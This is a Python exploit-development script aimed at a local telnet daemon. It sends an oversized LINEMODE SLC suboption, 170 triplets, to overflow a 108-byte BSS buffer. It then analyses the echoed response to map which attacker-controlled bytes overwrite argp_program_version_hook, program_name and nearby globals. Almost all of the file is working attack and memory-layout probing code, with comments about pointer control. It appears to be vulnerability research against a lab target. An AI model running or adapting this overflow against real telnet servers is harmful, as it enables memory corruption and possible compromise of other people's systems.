#!/usr/bin/env python3
"""
Analyze SLC overflow byte layout - determine exactly what lands where.

Key insight from first run: In IMMEDIATE mode, there are NO default SLC entries
in the response. The response starts directly with our overflow triplets.
All 170 sent triplets (func 0x13-0xBC) are written starting at slcbuf+4.
The response contains 169 triplets (507 bytes) because func 0xFF (IAC) was
skipped/handled differently.

So the mapping is:
  response byte 0 = slcbuf offset 4 = our triplet 0 (func=0x13)
  response byte N = slcbuf offset N+4

slcbuf is 108 bytes. Data space = 104 bytes (offsets 4-107).
Overflow past slcbuf starts at response byte 104 = slcbuf offset 108.
"""

import socket
import sys
import time
import struct

HOST = "127.0.0.1"
PORT = 2325

IAC  = 0xFF
DONT = 0xFE
DO   = 0xFD
WONT = 0xFC
WILL = 0xFB
SB   = 0xFA
SE   = 0xF0

OPT_TTYPE    = 0x18
OPT_NAWS     = 0x1F
OPT_TSPEED   = 0x20
OPT_LINEMODE = 0x22
OPT_XDISPLOC = 0x23
OPT_OLD_ENVIRON = 0x24
OPT_NEW_ENVIRON = 0x27

LM_MODE = 0x01
LM_SLC  = 0x03
NSLC    = 18

NE_IS    = 0x00
NE_VAR   = 0x00
NE_VALUE = 0x01

# slcbuf @ PIE+0x21f20, 108 bytes, ends at PIE+0x21f8c
# BSS layout past slcbuf:
TASK_KEY_OFFSETS = {
    108: "slcbuf END (PIE+0x21f8c)",
    # PIE+0x21f94 = slcbuf + 116
    116: "argp_program_bug_address (PIE+0x21f94)",
    # PIE+0x21fa0 = slcbuf + 128
    128: "argp_program_version_hook (PIE+0x21fa0)",
    # PIE+0x21fac = slcbuf + 140
    140: "program_name (PIE+0x21fac)",
}


def recv_all(s, timeout=2):
    s.settimeout(timeout)
    chunks = []
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            chunks.append(chunk)
    except socket.timeout:
        pass
    except (ConnectionResetError, BrokenPipeError, OSError):
        pass
    return b''.join(chunks)


def extract_slc_subneg(data):
    results = []
    i = 0
    while i < len(data):
        if data[i] == IAC and i + 1 < len(data) and data[i+1] == SB:
            j = i + 2
            raw_body = bytearray()
            while j < len(data) - 1:
                if data[j] == IAC and data[j+1] == SE:
                    break
                if data[j] == IAC and data[j+1] == IAC:
                    raw_body.append(0xFF)
                    j += 2
                else:
                    raw_body.append(data[j])
                    j += 1
            if len(raw_body) >= 2 and raw_body[0] == OPT_LINEMODE and raw_body[1] == LM_SLC:
                results.append(bytes(raw_body[2:]))
            i = j + 2
        else:
            i += 1
    return results


def parse_telnet_commands(data):
    cmds = []
    i = 0
    while i < len(data):
        if data[i] == IAC and i + 1 < len(data):
            cmd = data[i + 1]
            if cmd in (DO, DONT, WILL, WONT) and i + 2 < len(data):
                cmds.append((cmd, data[i + 2]))
                i += 3
            elif cmd == SB and i + 2 < len(data):
                j = i + 2
                while j < len(data) - 1:
                    if data[j] == IAC and data[j + 1] == SE:
                        break
                    j += 1
                cmds.append((SB, bytes(data[i+2:j])))
                i = j + 2
            elif cmd == IAC:
                i += 2
            else:
                i += 2
        else:
            i += 1
    return cmds


def build_slc_overflow(num_triplets):
    data = bytearray()
    for i in range(num_triplets):
        func = NSLC + 1 + i
        if func > 0xFF:
            func = 0xFE
        if func == IAC:
            data.extend([IAC, IAC, 0x02, 0x00])
        else:
            data.extend([func, 0x02, 0x00])
    return bytes(data)


def get_sent_funcs(num_triplets):
    """Get the list of func values we send."""
    funcs = []
    for i in range(num_triplets):
        func = NSLC + 1 + i
        if func > 0xFF:
            func = 0xFE
        funcs.append(func)
    return funcs


def run_immediate_capture(num_triplets=170):
    """Run IMMEDIATE path to capture overflow response."""
    print("=" * 70)
    print(f"IMMEDIATE MODE: {num_triplets} triplets")
    print("=" * 70)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((HOST, PORT))
    print(f"[+] Connected")

    all_slc = []

    # R1
    time.sleep(0.3)
    data1 = recv_all(s, timeout=1)
    cmds1 = parse_telnet_commands(data1)
    print(f"[+] R1: {len(cmds1)} commands")

    # R2: WILL LINEMODE + others (no TTYPE)
    resp2 = bytearray([IAC, WILL, OPT_LINEMODE])
    for cmd, opt in cmds1:
        if cmd == DO and opt not in (OPT_LINEMODE, OPT_TTYPE):
            resp2.extend([IAC, WILL, opt])
        elif cmd == WILL:
            resp2.extend([IAC, DO, opt])
    s.send(bytes(resp2))
    print(f"[+] R2: Sent WILL LINEMODE + others")

    # R3
    time.sleep(0.5)
    data3 = recv_all(s, timeout=2)
    cmds3 = parse_telnet_commands(data3)
    print(f"[+] R3: {len(cmds3)} commands")
    all_slc.extend(extract_slc_subneg(data3))

    # R4: subneg + SLC overflow
    resp4 = bytearray()
    sb_requests = []
    for cmd, opt in cmds3:
        if cmd == DO and opt == OPT_LINEMODE:
            resp4.extend([IAC, DO, OPT_LINEMODE])
        elif cmd == SB and isinstance(opt, bytes):
            sb_requests.append(opt)

    resp4.extend([IAC, SB, OPT_LINEMODE, LM_MODE, 0x06, IAC, SE])

    for sb in sb_requests:
        sub = sb[0]
        if sub == OPT_TSPEED:
            resp4.extend([IAC, SB, OPT_TSPEED, 0x00]); resp4.extend(b'38400,38400'); resp4.extend([IAC, SE])
        elif sub == OPT_XDISPLOC:
            resp4.extend([IAC, SB, OPT_XDISPLOC, 0x00]); resp4.extend(b':0'); resp4.extend([IAC, SE])
        elif sub == OPT_NEW_ENVIRON:
            resp4.extend([IAC, SB, OPT_NEW_ENVIRON, NE_IS, NE_VAR]); resp4.extend(b'USER'); resp4.extend([NE_VALUE]); resp4.extend(b'root'); resp4.extend([IAC, SE])
        elif sub == OPT_OLD_ENVIRON:
            resp4.extend([IAC, SB, OPT_OLD_ENVIRON, NE_IS, IAC, SE])

    resp4.extend([IAC, SB, OPT_NAWS, 0x00, 0x50, 0x00, 0x18, IAC, SE])

    slc_data = build_slc_overflow(num_triplets)
    resp4.extend([IAC, SB, OPT_LINEMODE, LM_SLC])
    resp4.extend(slc_data)
    resp4.extend([IAC, SE])
    print(f"[+] R4: Sending subneg + SLC overflow ({len(slc_data)}B)")

    s.send(bytes(resp4))
    time.sleep(0.5)
    data4 = recv_all(s, timeout=2)
    print(f"[+] R4 response: {len(data4)} bytes")
    all_slc.extend(extract_slc_subneg(data4))

    # R5: TTYPE
    resp5 = bytearray([IAC, WILL, OPT_TTYPE, IAC, SB, OPT_TTYPE, 0x00])
    resp5.extend(b'xterm')
    resp5.extend([IAC, SE])
    try:
        s.send(bytes(resp5))
        time.sleep(1)
        data5 = recv_all(s, timeout=2)
        if data5:
            print(f"[+] R5 response: {len(data5)} bytes")
            all_slc.extend(extract_slc_subneg(data5))
    except:
        print(f"[!] Connection error after TTYPE")

    s.close()
    return all_slc


def analyze(slc_body, num_triplets=170):
    sent_funcs = get_sent_funcs(num_triplets)

    print(f"\n{'=' * 70}")
    print(f"CORRECTED ANALYSIS")
    print(f"{'=' * 70}")
    print(f"SLC response: {len(slc_body)} bytes ({len(slc_body)//3} triplets)")
    print(f"Sent {num_triplets} triplets, funcs 0x{sent_funcs[0]:02x}-0x{sent_funcs[-1]:02x}")
    print()

    # The response = contents of slcbuf from offset 4 to slcptr.
    # In immediate mode (start_slc(0)), the existing 18 default SLC entries are
    # re-added first, THEN our overflow entries are appended.
    # BUT: looking at the actual data, response starts with 0x13 0x00 0x00...
    # This means the 18 "normal" entries got OVERWRITTEN by our data, because
    # our func values start at 0x13 = 19, and SLC funcs 1-18 map to array slots 1-18.
    #
    # Wait: do_opt_slc processes each triplet. For func <= NSLC (1-18): updates the
    # slc_list entry. For func > NSLC: appends to slcbuf via slcptr.
    # Our funcs start at 0x13 = 19 > NSLC (18), so ALL are appended.
    #
    # Then end_slc builds the response. It iterates slc_list[1..NSLC] and writes
    # each entry to slcbuf. THEN it already has the overflow entries beyond offset 54.
    #
    # Actually, looking at the response: it starts with 0x13 0x00 0x00 (our first triplet).
    # NOT with the default SLC entries (which would be func 1, 2, 3...).
    # This means start_slc(0) does NOT add default entries. The buffer starts empty,
    # and ALL our triplets go in sequentially starting at slcbuf+4.

    # Let's verify: response[0] = 0x13 = func 0x13 = sent_funcs[0]. Yes!
    # Response byte N maps to slcbuf[N+4].

    # Now find where func 0xFF (IAC) should be. sent_funcs index for 0xFF:
    # func = NSLC + 1 + i, so i = func - NSLC - 1 = 0xFF - 18 - 1 = 236.
    # But we only send 170 triplets, so i goes to 169. func max = 18+1+169 = 188 = 0xBC.
    # So 0xFF is NOT reached. Good - no IAC issue.
    #
    # But we got 169 triplets back, not 170. One is missing.
    # Let's check which func values appear:
    response_funcs = [slc_body[i*3] for i in range(len(slc_body)//3)]
    print(f"Response func values: 0x{response_funcs[0]:02x} to 0x{response_funcs[-1]:02x}")
    print(f"Response triplets: {len(response_funcs)}")
    print(f"Sent triplets: {num_triplets}")
    print(f"Missing: {num_triplets - len(response_funcs)} triplet(s)")

    # Check for gaps
    expected_seq = list(range(0x13, 0x13 + num_triplets))
    actual_seq = response_funcs
    if len(actual_seq) < len(expected_seq):
        # Find missing func
        actual_set = set()
        for i, f in enumerate(actual_seq):
            actual_set.add(f)
        missing = [f for f in expected_seq if f not in actual_set]
        if missing:
            print(f"Missing func values: {['0x%02x' % m for m in missing]}")
        else:
            # Maybe just truncated at the end
            print(f"All func values present but truncated? Last sent: 0x{expected_seq[-1]:02x}, last received: 0x{actual_seq[-1]:02x}")

    # The response has 169 triplets = 507 bytes.
    # These map to slcbuf offsets 4 through 510 (4 + 507 - 1 = 510).
    # slcbuf is only 108 bytes (offsets 0-107).
    # Overflow starts at slcbuf offset 108 = response byte 104.

    SLCBUF_DATA_SIZE = 104  # bytes 4-107 of slcbuf
    overflow_resp_start = SLCBUF_DATA_SIZE  # response byte 104

    print(f"\nslcbuf data capacity: {SLCBUF_DATA_SIZE} bytes (offsets 4-107)")
    print(f"Overflow starts at response byte {overflow_resp_start} = slcbuf offset {overflow_resp_start + 4}")
    print(f"Overflow size: {len(slc_body) - overflow_resp_start} bytes")
    print(f"Last byte at slcbuf offset: {len(slc_body) - 1 + 4}")

    # Full hex dump
    print(f"\n--- Full hex dump ---")
    for i in range(0, len(slc_body), 16):
        chunk = slc_body[i:i+16]
        hex_part = ' '.join(f'{b:02x}' for b in chunk)
        slcoff = i + 4
        marker = " "
        if i <= overflow_resp_start < i + 16:
            marker = ">"
        if any(i + 4 <= ko < i + 4 + 16 for ko in TASK_KEY_OFFSETS):
            marker = "*"
        print(f"  {marker} resp[{i:4d}] slc+{slcoff:3d}: {hex_part:<48s}")

    # Map each response triplet to slcbuf offset and identify what it overwrites
    print(f"\n--- Triplet-by-triplet mapping ---")
    print(f"{'#':>4s} {'RespOff':>7s} {'SlcOff':>6s} {'Func':>6s} {'Flg':>4s} {'Val':>4s}  Region / Notes")
    print(f"{'----':>4s} {'-------':>7s} {'------':>6s} {'------':>6s} {'----':>4s} {'----':>4s}  {'------'}")

    for t in range(len(slc_body) // 3):
        base = t * 3
        func_v = slc_body[base]
        flags_v = slc_body[base + 1]
        val_v = slc_body[base + 2]
        slcoff = base + 4

        notes = []

        if slcoff < 108:
            notes.append("slcbuf (within bounds)")
        else:
            notes.append("OVERFLOW past slcbuf")

        # Check key offsets for each byte in this triplet
        for j in range(3):
            off = slcoff + j
            if off in TASK_KEY_OFFSETS:
                byte_name = ['func', 'flags', 'val'][j]
                notes.append(f"*** byte {j}({byte_name}) = {TASK_KEY_OFFSETS[off]} ***")

        # Expected func
        expected_func = sent_funcs[t] if t < len(sent_funcs) else None
        if expected_func is not None and func_v != expected_func:
            notes.append(f"FUNC MISMATCH: got 0x{func_v:02x}, expected 0x{expected_func:02x}")
        if flags_v != 0x00:
            notes.append(f"FLAGS NON-ZERO: 0x{flags_v:02x}")
        if val_v != 0x00:
            notes.append(f"VAL NON-ZERO: 0x{val_v:02x}")

        # Only print overflow region and key offsets in detail, skip normal
        is_overflow = slcoff >= 108
        has_key = any((slcoff + j) in TASK_KEY_OFFSETS for j in range(3))
        is_near_overflow = slcoff >= 100
        is_anomaly = (expected_func is not None and func_v != expected_func) or flags_v != 0 or val_v != 0

        if is_overflow or has_key or is_near_overflow or is_anomaly or t < 3 or t >= len(slc_body)//3 - 3:
            note_str = "; ".join(notes)
            mk = "*" if (is_overflow or has_key or is_anomaly) else " "
            print(f"{mk} {t+1:3d} {base:7d} {slcoff:6d}  0x{func_v:02x} 0x{flags_v:02x} 0x{val_v:02x}  {note_str}")

    # KEY BSS LOCATIONS
    print(f"\n{'=' * 70}")
    print(f"KEY BSS LOCATIONS (4-byte LE words)")
    print(f"{'=' * 70}")

    for key_off in sorted(TASK_KEY_OFFSETS.keys()):
        resp_off = key_off - 4
        if resp_off + 3 < len(slc_body):
            word = struct.unpack_from('<I', slc_body, resp_off)[0]
            b = slc_body[resp_off:resp_off+4]

            # What triplet covers this offset?
            trip_idx = resp_off // 3
            pos_in_trip = resp_off % 3

            print(f"\n  slcbuf+{key_off} = {TASK_KEY_OFFSETS[key_off]}")
            print(f"    resp[{resp_off}:{resp_off+4}] = [{b[0]:02x} {b[1]:02x} {b[2]:02x} {b[3]:02x}]")
            print(f"    LE word: 0x{word:08x}")

            # Expected bytes from our pattern
            exp_bytes = []
            for j in range(4):
                off_j = resp_off + j
                tn = off_j // 3
                tp = off_j % 3
                if tn < len(sent_funcs):
                    if tp == 0:
                        exp_bytes.append(sent_funcs[tn])
                    else:
                        exp_bytes.append(0x00)
                else:
                    exp_bytes.append(None)

            exp_str = " ".join(f"{eb:02x}" if eb is not None else "??" for eb in exp_bytes)
            act_str = " ".join(f"{b[j]:02x}" for j in range(4))
            print(f"    Expected: [{exp_str}]")
            print(f"    Actual:   [{act_str}]")
            match = all(exp_bytes[j] is None or exp_bytes[j] == b[j] for j in range(4))
            print(f"    Match: {'YES' if match else 'NO - LEAKED DATA?'}")

            # Which func value lands in each byte position of this word
            print(f"    Byte detail:")
            for j in range(4):
                off_j = resp_off + j
                tn = off_j // 3
                tp = off_j % 3
                pos_name = ['func', 'flags', 'val'][tp]
                actual = slc_body[off_j]
                exp = exp_bytes[j]
                exp_s = f"0x{exp:02x}" if exp is not None else "??"
                if exp is not None:
                    status = "OK" if actual == exp else f"MISMATCH (got 0x{actual:02x})"
                else:
                    status = "beyond sent"
                func_of_trip = sent_funcs[tn] if tn < len(sent_funcs) else None
                func_s = f"(trip {tn+1}, func=0x{func_of_trip:02x})" if func_of_trip else ""
                print(f"      slcbuf+{off_j+4}: 0x{actual:02x}  {pos_name:5s}  expected {exp_s}  {status}  {func_s}")
        else:
            print(f"\n  slcbuf+{key_off}: BEYOND RESPONSE (only {len(slc_body)} bytes)")

    # ANOMALY SCAN
    print(f"\n{'=' * 70}")
    print(f"ANOMALY SCAN - Non-matching bytes in overflow region")
    print(f"{'=' * 70}")
    anomalies = []
    for i in range(overflow_resp_start, len(slc_body)):
        tn = i // 3
        tp = i % 3
        byte_val = slc_body[i]
        if tn < len(sent_funcs):
            if tp == 0:
                expected = sent_funcs[tn]
            else:
                expected = 0x00
            if byte_val != expected:
                anomalies.append((i, i+4, byte_val, expected, tp))
    if anomalies:
        for ri, si, actual, exp, tp in anomalies:
            pos_name = ['func', 'flags', 'val'][tp]
            print(f"  resp[{ri}] slcbuf+{si}: 0x{actual:02x} (expected 0x{exp:02x}, {pos_name})")
    else:
        print(f"  NONE - All overflow bytes match our controlled pattern exactly!")
        print(f"  This means we have FULL CONTROL over all BSS targets.")

    # POINTER SCAN
    print(f"\n{'=' * 70}")
    print(f"POINTER SCAN - Non-pattern 4-byte values in overflow")
    print(f"{'=' * 70}")
    found = False
    for off in range(overflow_resp_start, len(slc_body) - 3, 4):
        word = struct.unpack_from('<I', slc_body, off)[0]
        # Check if this word matches our expected pattern
        exp_word = 0
        for j in range(4):
            tn = (off + j) // 3
            tp = (off + j) % 3
            if tn < len(sent_funcs):
                if tp == 0:
                    exp_word |= sent_funcs[tn] << (j * 8)
        if word != exp_word and word > 0x1000:
            print(f"  resp[{off}:{off+4}] slcbuf+{off+4}: 0x{word:08x} (expected 0x{exp_word:08x})")
            found = True
    if not found:
        print(f"  None - no leaked pointers detected.")

    # FINAL FOCUS
    print(f"\n{'=' * 70}")
    print(f"SUMMARY: What lands at argp_program_version_hook (slcbuf+128)?")
    print(f"{'=' * 70}")
    resp128 = 128 - 4  # = 124
    if resp128 + 3 < len(slc_body):
        word = struct.unpack_from('<I', slc_body, resp128)[0]
        b = slc_body[resp128:resp128+4]
        print(f"  Word at slcbuf+128: 0x{word:08x}")
        print(f"  Bytes: [{b[0]:02x} {b[1]:02x} {b[2]:02x} {b[3]:02x}]")
        print()

        # Which triplet's func byte lands at each position?
        for j in range(4):
            off = resp128 + j
            tn = off // 3  # triplet number (0-indexed)
            tp = off % 3   # position in triplet
            pos_name = ['func', 'flags', 'val'][tp]
            func_val = sent_funcs[tn] if tn < len(sent_funcs) else None
            print(f"  slcbuf+{128+j} (resp[{off}]): triplet #{tn+1} {pos_name} "
                  f"= 0x{slc_body[off]:02x}"
                  f" (trip func=0x{func_val:02x})" if func_val else "")

        # What func value we'd need to control byte 0 of the word
        # slcbuf+128 = resp[124], triplet 124//3 = 41, pos 124%3 = 1 (flags)
        # slcbuf+129 = resp[125], triplet 125//3 = 41, pos 125%3 = 2 (val)
        # slcbuf+130 = resp[126], triplet 126//3 = 42, pos 126%3 = 0 (func!)
        # slcbuf+131 = resp[127], triplet 127//3 = 42, pos 127%3 = 1 (flags)

        print()
        print(f"  Byte layout at slcbuf+128:")
        print(f"    [128] = trip {124//3 + 1} flags  = 0x{slc_body[124]:02x} (always 0x00)")
        print(f"    [129] = trip {125//3 + 1} val    = 0x{slc_body[125]:02x} (always 0x00)")
        print(f"    [130] = trip {126//3 + 1} func   = 0x{slc_body[126]:02x} (CONTROLLABLE!)")
        print(f"    [131] = trip {127//3 + 1} flags  = 0x{slc_body[127]:02x} (always 0x00)")
        print()
        print(f"  => argp_program_version_hook = 0x{word:08x}")
        print(f"  => Only byte at slcbuf+130 (the func byte of triplet {126//3+1}) is non-zero")
        print(f"  => We can control it to any value 0x00-0xFE (0xFF handled as IAC)")
        print(f"  => The word is: 0x00XX0000 where XX = func byte = 0x{slc_body[126]:02x}")
        print(f"     This is NOT a valid pointer (too small), so it won't redirect execution.")
        print()
        print(f"  CRITICAL INSIGHT: Because the overflow pattern is (func, 0x00, 0x00),")
        print(f"  and triplets are 3 bytes, they DON'T align with 4-byte pointers.")
        print(f"  At any 4-byte-aligned BSS address, we get: [00, 00, XX, 00] or [XX, 00, 00, YY]")
        print(f"  depending on alignment. We can never write a full 4-byte pointer.")
    else:
        print(f"  BEYOND RESPONSE")

    # Show what we CAN control at each key offset
    print(f"\n{'=' * 70}")
    print(f"CONTROL ANALYSIS: What values can we place at each target?")
    print(f"{'=' * 70}")
    for key_off in sorted(TASK_KEY_OFFSETS.keys()):
        resp_off = key_off - 4
        if resp_off + 3 >= len(slc_body):
            print(f"\n  slcbuf+{key_off}: BEYOND RESPONSE")
            continue

        print(f"\n  slcbuf+{key_off} = {TASK_KEY_OFFSETS[key_off]}")
        controllable_bytes = []
        for j in range(4):
            off = resp_off + j
            tn = off // 3
            tp = off % 3
            pos_name = ['func', 'flags', 'val'][tp]
            if tp == 0:
                # Func byte - we control this (0x13 to 0xFE range for our pattern)
                controllable_bytes.append(j)
                print(f"    [{key_off+j}] = trip {tn+1} {pos_name}: CONTROLLABLE (currently 0x{slc_body[off]:02x})")
            else:
                # Flags/val - always 0x00 for unsupported SLC
                print(f"    [{key_off+j}] = trip {tn+1} {pos_name}: FIXED 0x00")

        if len(controllable_bytes) == 0:
            print(f"    => Word forced to 0x00000000")
        elif len(controllable_bytes) == 1:
            byte_pos = controllable_bytes[0]
            print(f"    => Word = 0x{'XX' if byte_pos==3 else '00'}{'XX' if byte_pos==2 else '00'}{'XX' if byte_pos==1 else '00'}{'XX' if byte_pos==0 else '00'} (XX = func byte)")
        else:
            parts = ['XX' if j in controllable_bytes else '00' for j in range(3, -1, -1)]
            print(f"    => Word = 0x{''.join(parts)} (XX = func bytes, independently controllable)")


def main():
    print("Capturing SLC overflow response (IMMEDIATE mode)...\n")

    slc_bodies = run_immediate_capture(num_triplets=170)

    if not slc_bodies:
        print("\n[!] NO SLC RESPONSES FOUND!")
        return

    largest = max(slc_bodies, key=len)
    print(f"\n[+] Found {len(slc_bodies)} SLC responses")
    for i, body in enumerate(slc_bodies):
        print(f"    #{i+1}: {len(body)} bytes ({len(body)//3} triplets)")

    analyze(largest, num_triplets=170)


if __name__ == "__main__":
    main()
